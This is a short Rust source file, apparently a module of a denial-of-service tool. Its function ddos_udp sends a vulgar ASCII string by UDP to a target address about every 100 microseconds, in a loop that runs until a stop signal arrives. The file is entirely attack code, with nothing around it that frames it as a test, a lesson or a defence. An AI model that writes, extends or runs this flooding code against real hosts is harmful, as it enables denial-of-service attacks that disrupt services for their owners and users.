use std::error::Error;
use std::net::UdpSocket;
use tokio::sync::mpsc;
use tokio::time::{sleep, Duration};

async fn send_udp_message(server_addr: &str) -> Result<(), Box<dyn Error>> {
    // Crée un socket UDP asynchrone

    let socket = UdpSocket::bind("0.0.0.0:0")?;

    // Message à envoyer
    let msg = b"8==========>";

    socket.send_to(msg, server_addr).expect("TODO: panic message");
    //socket.send_to(msg, server_addr)?;
    //println!("Message envoyé à {}", server_addr);

    Ok(())
}

pub(crate) async fn ddos_udp(rx: &mut mpsc::Receiver<()>, target_clone: String) {

    let mut cmp = 0;

    loop {
        tokio::select! {
            _ = sleep(Duration::from_nanos(100000)) => {
                println!("cmp = {}", cmp);
                send_udp_message(&target_clone).await.expect("Erreur lors de l'envoi du message UDP");
                cmp += 1;
            }
            _ = rx.recv() => {
                // Arrêter d'afficher des messages lorsque le signal est reçu
                println!("Arret fin du temps");
                break;
            }
        }
    }
}